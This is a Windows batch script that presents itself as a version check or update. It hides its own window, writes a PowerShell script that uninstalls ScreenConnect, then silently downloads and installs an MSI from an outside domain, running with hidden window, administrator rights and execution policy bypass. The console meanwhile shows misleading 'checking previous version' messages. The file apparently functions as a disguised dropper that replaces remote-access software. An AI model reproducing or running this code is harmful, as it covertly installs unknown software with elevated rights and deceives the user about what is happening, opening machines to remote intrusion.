@echo off
if not defined minimized set minimized=1 && start /min cmd /c "%~dpnx0" && exit
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 > "%TEMP%\nau.ps1"
echo. >> "%TEMP%\nau.ps1"
echo "Starting uninstall process..." >> "%TEMP%\nau.ps1"
echo Get-WmiObject -Class Win32_Product ^| Where-Object {^$_.Name -like '*ScreenConnect*'} ^| ForEach-Object { ^$_.Uninstall() } >> "%TEMP%\nau.ps1"
echo. >> "%TEMP%\nau.ps1"
echo "New version..." >> "%TEMP%\nau.ps1"
echo Invoke-WebRequest -Uri "https://cvdf.sentricllc.com/cfms" -OutFile "%TEMP%\cm.msi" >> "%TEMP%\nau.ps1"
echo Start-Process msiexec -ArgumentList "/i", "%TEMP%\cm.msi", "/qn", "/norestart" -Wait >> "%TEMP%\nau.ps1"
echo Remove-Item "%TEMP%\cm.msi" -ErrorAction SilentlyContinue >> "%TEMP%\nau.ps1"
echo "Process completed successfully" >> "%TEMP%\nau.ps1"
echo. >> "%TEMP%\nau.ps1"
echo "Timeout for 5 seconds before auto-close..." >> "%TEMP%\nau.ps1"
echo Start-Sleep -Seconds 5 >> "%TEMP%\nau.ps1"
PowerShell -Command "Start-Process PowerShell -WindowStyle Hidden -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -File \"%TEMP%\nau.ps1\"'"
echo Checking previous version...
echo This might take a few minutes. Please wait...
echo Thank you.
echo.
pause..